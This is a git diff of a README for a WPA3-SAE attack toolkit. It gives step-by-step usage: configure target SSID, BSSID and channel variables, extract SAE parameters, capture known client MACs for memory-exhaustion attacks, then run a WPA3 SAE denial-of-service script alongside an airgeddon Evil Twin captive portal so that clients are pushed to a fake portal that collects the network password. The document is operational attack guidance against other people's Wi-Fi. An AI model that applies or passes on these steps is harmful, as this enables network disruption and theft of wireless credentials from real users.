@@ -86,44 +86,61 @@ Use a standard **Managed Mode** Wi-Fi interface (e.g., `wlan0`) to extract valid
 
 1. **Run extraction for the 5 GHz band first:**
 
+   Configure the target parameters at the top of `sae_extractor_arxiv_all_groups_v2.py`:
+
+   ```python
+   MANAGED_IFACE  = "wlan0"
+   TARGET_SSID    = "Target_SSID"
+   TARGET_BSSID   = "AA:BB:CC:DD:EE:11".lower()
+   TARGET_BAND    = "5GHz"
+   TARGET_CHANNEL = "36"
+   ```
+
+   Then run the script:
+
    ```bash
-   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
-       --iface wlan0 \
-       --ssid "Target_SSID" \
-       --bssid "AA:BB:CC:DD:EE:11" \
-       --band 5GHz \
-       --channel 36
+   sudo python3 sae_extractor_arxiv_all_groups_v2.py
    ```
 
    Once completed, the script writes the extracted 5 GHz parameters to `sae_params.json`.
 
 2. **Run extraction for the 2.4 GHz band next:**
 
-   Run the script again in the same directory for the 2.4 GHz band:
+   Update the parameters at the top of `sae_extractor_arxiv_all_groups_v2.py` for the 2.4 GHz band:
+
+   ```python
+   MANAGED_IFACE  = "wlan0"
+   TARGET_SSID    = "Target_SSID"
+   TARGET_BSSID   = "AA:BB:CC:DD:EE:12".lower()
+   TARGET_BAND    = "2.4GHz"
+   TARGET_CHANNEL = "6"
+   ```
+
+   Run the script again in the same directory:
 
    ```bash
-   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
-       --iface wlan0 \
-       --ssid "Target_SSID" \
-       --bssid "AA:BB:CC:DD:EE:12" \
-       --band 2.4GHz \
-       --channel 6
+   sudo python3 sae_extractor_arxiv_all_groups_v2.py
    ```
 
    **Note:** The existing `sae_params.json` is **not** overwritten; the script automatically merges the `2.4GHz` data alongside the `5GHz` data in `sae_params.json` (and `6GHz` if run for 6 GHz).
 
 3. **Optional – Capture Known Client MACs (`capture_known_macs_v2.py`):**
 
-   To populate `known_macs` for `memory_exhaustion` or `unknown_pw_id`, run:
+   To populate `known_macs` for `memory_exhaustion` or `unknown_pw_id`, configure the target parameters at the top of `capture_known_macs_v2.py`:
+
+   ```python
+   MONITOR_IFACE  = "wlan0mon"
+   MANAGED_IFACE  = "wlan1"
+   TARGET_SSID    = "Target_SSID"
+   TARGET_BSSID   = "AA:BB:CC:DD:EE:11".lower()
+   TARGET_BAND    = "5GHz"
+   TARGET_CHANNEL = "36"
+   ```
+
+   Then run the script:
 
    ```bash
-   sudo python3 capture_known_macs_v2.py \
-       --monitor-iface wlan0mon \
-       --managed-iface wlan1 \
-       --ssid "Target_SSID" \
-       --bssid "AA:BB:CC:DD:EE:11" \
-       --band 5GHz \
-       --channel 36
+   sudo python3 capture_known_macs_v2.py
    ```
 
    This automatically appends the captured MAC list to `sae_params.json`.
@@ -172,27 +189,31 @@ python3 wpa3_sae_formal_attacks_v2.py --help
 > 💡 **WPA2/WPA3 Transition Mode:** This workflow is designed for **WPA2/WPA3 Transition Mode** networks, where a valid WPA2 handshake is captured first! `airgeddon` still verifies the entered password directly against that captured handshake as usual. The WPA3-SAE DoS script just runs alongside `airgeddon` to block WPA3/PMF (802.11w) clients that are immune to standard WPA2 deauths. Also, the monitor script doesn't stop on wrong attempts (`ag.et_attempts.txt`)—it only stops the WPA3 attack once `airgeddon` has verified the password against the handshake and written the final `evil_twin_captive_portal_password-*.txt` file.
 
 1. **Configure the Default Save Path in airgeddon:**
-Use the [`default_save_path.sh`](https://github.com/KeyofBlueS/airgeddon-plugins/blob/master/default_save_path.sh) plugin to set a fixed default output directory in `airgeddon` (e.g., `airgeddon/plugins/output`) so `watch_pass_auto_close_en.sh` can automatically detect captured password files.
+
+   Use the [`default_save_path.sh`](https://github.com/KeyofBlueS/airgeddon-plugins/blob/master/default_save_path.sh) plugin to set a fixed default output directory in `airgeddon` (e.g., `airgeddon/plugins/output`) so `watch_pass_auto_close_en.sh` can automatically detect captured password files.
 
 2. **Start airgeddon Captive Portal:**
-Launch airgeddon and set up your Evil Twin Captive Portal attack (using the captured WPA2 handshake) until the portal is actively running.
+
+   Launch airgeddon and set up your Evil Twin Captive Portal attack (using the captured WPA2 handshake) until the portal is actively running.
 
 3. **Start the Live Monitor (Terminal 1):**
-Make `watch_pass_auto_close_en.sh` executable and run it:
-```bash
-chmod +x watch_pass_auto_close_en.sh
-./watch_pass_auto_close_en.sh
 
-```
+   Make `watch_pass_auto_close_en.sh` executable and run it:
 
-*(Make sure `PW_OUTPUT_DIR` inside `watch_pass_auto_close_en.sh` matches the directory configured in [`default_save_path.sh`](https://github.com/KeyofBlueS/airgeddon-plugins/blob/master/default_save_path.sh)).*
+   ```bash
+   chmod +x watch_pass_auto_close_en.sh
+   ./watch_pass_auto_close_en.sh
+   ```
+
+   *(Make sure `PW_OUTPUT_DIR` inside `watch_pass_auto_close_en.sh` matches the directory configured in [`default_save_path.sh`](https://github.com/KeyofBlueS/airgeddon-plugins/blob/master/default_save_path.sh)).*
 
 4. **Start the Auto-Close Attack Script (Terminal 2):**
-Launch the auto-close version of the attack suite with `sae_params.json`:
-```bash
-sudo python3 wpa3_sae_formal_attacks_auto_close_v2_en.py --sae-file sae_params.json
 
-```
+   Launch the auto-close version of the attack suite with `sae_params.json`:
+
+   ```bash
+   sudo python3 wpa3_sae_formal_attacks_auto_close_v2_en.py --sae-file sae_params.json
+   ```
 
 **How it works:**
 
